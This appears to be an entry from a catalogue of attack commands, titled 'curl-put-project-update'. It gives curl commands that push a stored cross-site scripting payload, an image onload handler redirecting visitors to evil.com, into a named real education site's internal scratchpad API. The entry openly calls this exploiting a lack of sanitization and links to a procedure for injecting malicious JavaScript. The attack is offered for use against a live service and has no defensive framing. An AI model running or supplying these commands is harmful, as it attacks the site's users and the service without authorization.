---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  curl -X PUT -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type:
  application/json" -d '{"content": "<img src=\"x\"
  onload=\"window.location=\'https://evil.com\';\">"}'
  https://www.khanacademy.org/api/internal/scratchpads/ID
tags:
  - api
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T03:16:37.219Z'
verified: false
validated: true
submitted: true
---
# curl-put-project-update

## Command

```bash
curl -X PUT -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json" -d '{"content": "<img src=\"x\" onload=\"window.location=\'https://evil.com\';\">"}' https://www.khanacademy.org/api/internal/scratchpads/ID
```

## Description

This curl command sends a PUT request to update a Khan Academy document project with a malicious XSS payload in the content field, exploiting lack of sanitization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | Specifies the HTTP method | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Authentication header with session token | Yes |
| `-H "Content-Type: application/json"` | Sets JSON body type | Yes |
| `-d '{...}'` | JSON payload with tainted content | Yes |
| `https://.../ID` | Target endpoint with project ID | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT -H "Authorization: Bearer token123" -H "Content-Type: application/json" -d '{"content": "<b>Test</b>"}' https://www.khanacademy.org/api/internal/scratchpads/123
```

### Advanced Usage

```bash
curl -X PUT -H "Authorization: Bearer token123" -H "Content-Type: application/json" -d '{"content": "<img src=\"x\" onload=\"window.location=\'https://evil.com\';\">"}' https://www.khanacademy.org/api/internal/scratchpads/123 -v
```

## Expected Output

HTTP 200 OK response with updated project details, or error if authentication fails.

## Related

- [[Related Procedure|Inject-Malicious-JavaScript-into-Project-Update]]
